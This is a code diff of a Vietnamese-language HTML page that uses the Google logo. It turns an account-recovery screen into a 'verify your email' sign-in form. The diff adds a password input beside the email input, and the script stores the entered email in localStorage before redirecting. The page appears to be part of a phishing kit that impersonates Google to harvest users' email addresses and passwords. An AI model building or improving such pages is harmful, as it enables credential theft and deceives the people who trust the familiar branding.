@@ -6,22 +6,35 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <link rel="stylesheet" href="styles.css" />
-  <title>Input Gmail</title>
+  <title>Xác minh email</title>
 </head>
 
 <body>
   <div id="wrapper">
     <form id="form">
       <img id="logo" src="Logo/Google_2015_logo.svg.webp" />
-      <h3>Khôi phục tài khoản</h3>
-      <h4>Khôi phục tài khoản google của bạn</h4>
-      <div class="form-group">
-        <input type="text" id="emailInput" required />
-        <label for="">Email hoặc số điện thoại</label>
+      <h3>Đăng nhập để xác minh địa chỉ email của bạn</h3>
+      <h4>Để đăng nhập được địa chỉ email của bạn, trước hết hãy xác thực form đăng nhập của mình.</h4>
+      <div class="email">
+        <div class="form-group">
+          <input type="text" id="emailInput" required />
+          <label for="" class="label-fade">Email</label>
+        </div>
+        <div class="button-container">
+          <p class="try-another">Bạn quên địa chỉ email</p>
+        </div>
+      </div>
+      <div class="pass">
+        <div class="form-group">
+          <input type="password" id="passInput" required />
+          <label for="" class="label-fade">PassWord</label>
+        </div>
+        <div class="button-container">
+          <p class="try-another">Quên mật khẩu?</p>
+        </div>
       </div>
       <div class="button-container">
-        <p class="try-another">Bạn quên địa chỉ email</p>
-        <button class="next">Tiếp theo</button>
+        <button class="next">Xác mịnh địa chỉ</button>
       </div>
     </form>
     <div class="footer-text">
@@ -44,7 +57,6 @@
           event.preventDefault();
           const email = emailInput.value.trim();
           if (email !== '') {
-            // Lưu email vào Local Storage
             localStorage.setItem('email', email);
             window.location.href = 'Notification.html';
           } else {
